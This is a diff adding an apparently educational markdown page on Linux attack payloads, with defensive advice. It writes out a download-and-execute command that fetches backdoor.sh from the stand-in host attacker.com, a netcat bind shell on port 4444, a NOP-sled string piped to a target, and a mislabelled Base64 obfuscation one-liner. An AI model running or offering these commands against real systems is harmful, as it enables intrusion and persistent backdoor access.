@@ -1,0 +1,79 @@
+# Payloads to execute
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> A Linux payload is a piece of malicious code that is executed after an initial breach into a system. This payload can perform a variety of tasks, from stealing data to creating backdoors for future access.
+> 
+
+### 🧐 Why ?
+
+> Understanding Linux payloads is important for both hackers and security professionals. For hackers, payloads are the means to achieve their malicious objectives. For security professionals, understanding payloads can help in the timely detection and prevention of attacks.
+> 
+
+### ⛏️ How ?
+
+> To use a Linux payload, an attacker first needs to exploit a vulnerability to breach the system. Following this, the payload can be loaded and executed. To defend against such attacks, professionals need to consistently monitor systems for vulnerabilities and keep them patched.
+> 
+
+### ⏳ When ?
+
+> The use of Linux payloads in cybersecurity attacks has been prevalent for as long as Linux systems have been in use. Their popularity among attackers stems from the flexibility and power that Linux provides.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+A Linux payload is a type of malicious code that is executed after an initial breach into a Linux system. It is often a shell script or a binary executable that can carry out a range of tasks based on its programming. These tasks could include exfiltrating data, which is the unauthorized copying or transmission of data from within a system to an external destination or recipient. Data exfiltration can happen manually by someone with physical access to the computer or remotely by a hacker.
+
+Another common use of a Linux payload is to establish a persistent backdoor, which is a method of bypassing normal authentication or encryption in a computer, a product, or an embedded device, etc., or to remotely access software, an operating system, or a device. Once a system is compromised (i.e., a 'backdoor' is established), hackers can use the vulnerability to leave hidden software — a 'backdoor Trojan' — behind.
+
+Moreover, Linux payloads can also be used to launch further attacks on other systems. This could involve using the compromised system as a launchpad to attack other systems within the same network or to distribute malware across the internet.
+
+In order to avoid detection by security systems, payloads are often obfuscated or encrypted. Obfuscation involves making the code difficult to understand or interpret, while encryption involves encoding the data such that only authorized parties can access it.
+
+Defending against such payloads necessitates a multi-layered security approach. This includes regular patching, which involves updating and fixing the system software to protect against known vulnerabilities. Rigorous monitoring of the system is also necessary to detect any unusual activity that could indicate a breach. Finally, the use of intrusion detection systems (IDS) can help to identify suspicious activity by monitoring network traffic and system logs.
+
+Here's a simplified example of how a Linux payload might work for educational purposes. This is not a real payload, and should not be used for malicious purposes. The steps below simulate the process of a payload that creates a backdoor on a Linux system.
+
+1. **Exploit a vulnerability**: Suppose there's a known vulnerability in a specific version of a Linux server software that allows a buffer overflow to occur. An attacker might send a crafted packet that causes the server to crash and execute a shell command. This might look like:
+
+```bash
+echo -ne "\\x90\\x90\\x90\\x90...[payload]...\\x90\\x90\\x90\\x90" | nc target.com 80
+
+```
+
+(`\\x90` is a NOP instruction, and `[payload]` would be replaced with the actual payload)
+
+1. **Load and execute the payload**: The payload in this case might be a simple shell command that downloads and runs a script from the attacker's server:
+
+```bash
+wget <http://attacker.com/backdoor.sh> -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh
+
+```
+
+This command downloads a script, makes it executable, and runs it.
+
+1. **Create a backdoor**: The `backdoor.sh` script might look like this:
+
+```bash
+#!/bin/bash
+nc -lvp 4444 -e /bin/bash &> /dev/null &
+
+```
+
+This script starts a netcat listener on port 4444 and attaches a bash shell to it. This allows the attacker to connect to this port and execute commands.
+
+1. **Hide the payload**: The attacker might use various obfuscation techniques to make the payload harder to spot. Obfuscation can be as simple as encoding the payload in Base64. Here's a Python one-liner that encodes the payload:
+
+```python
+echo 'payload' | python -c 'import sys; import base64; print(base64.b64encode(sys.stdin.read()))'
+
+```
+
+1. **Defend against the payload**: A system administrator might defend against such an attack by regularly updating the server software (to fix known vulnerabilities), monitoring network traffic (to spot suspicious connections), and using an intrusion detection system (to identify known attack patterns).
